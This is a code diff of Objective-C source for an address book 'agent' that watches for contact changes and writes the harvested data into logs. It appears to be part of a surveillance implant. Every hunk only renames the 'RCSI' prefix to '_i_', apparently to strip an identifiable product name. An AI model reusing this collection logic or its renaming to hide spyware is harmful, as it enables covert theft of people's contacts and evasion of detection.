@@ -15,7 +15,7 @@
 
 //#define DEBUG
 
-NSString *kRCSIAgentAddressBookRunLoopMode = @"kRCSIAgentAddressBookRunLoopMode";
+NSString *k_i_AgentAddressBookRunLoopMode = @"k_i_AgentAddressBookRunLoopMode";
 
 typedef struct _Names {
 #define   CONTACTNAME    0xC025  
@@ -58,7 +58,7 @@ typedef struct _ABLogStrcut {
 #define ALL_ADDRESS (NSTimeInterval)0
 #define CFRELEASE(x) {if(x!=NULL)CFRelease(x);}
 
-@interface RCSIAgentAddressBook (hidden)
+@interface _i_AgentAddressBook (hidden)
 
 - (int)_incSemaphore;
 - (int)_decSemaphore;
@@ -76,7 +76,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
 {  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSIAgentAddressBook *agentAB = (RCSIAgentAddressBook *) context;
+  _i_AgentAddressBook *agentAB = (_i_AgentAddressBook *) context;
   
   [agentAB _incSemaphore];
   
@@ -85,7 +85,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   return; 
 }
 
-@implementation RCSIAgentAddressBook (hidden)
+@implementation _i_AgentAddressBook (hidden)
 
 - (int)_incSemaphore
 {
@@ -246,7 +246,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
   
 
-  RCSILogManager *logManager = [RCSILogManager sharedInstance];
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
   
   BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                            agentHeader: nil
@@ -462,7 +462,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
 
 @end
 
-@implementation RCSIAgentAddressBook
+@implementation _i_AgentAddressBook
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -496,7 +496,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
                                                   userInfo: nil 
                                                    repeats: YES];
   
-  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentAddressBookRunLoopMode];
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentAddressBookRunLoopMode];
 }
 
 - (void)startAgent
@@ -530,7 +530,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
               
-      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentAddressBookRunLoopMode 
+      [[NSRunLoop currentRunLoop] runMode: k_i_AgentAddressBookRunLoopMode 
                                beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];
 
       [innerPool release];
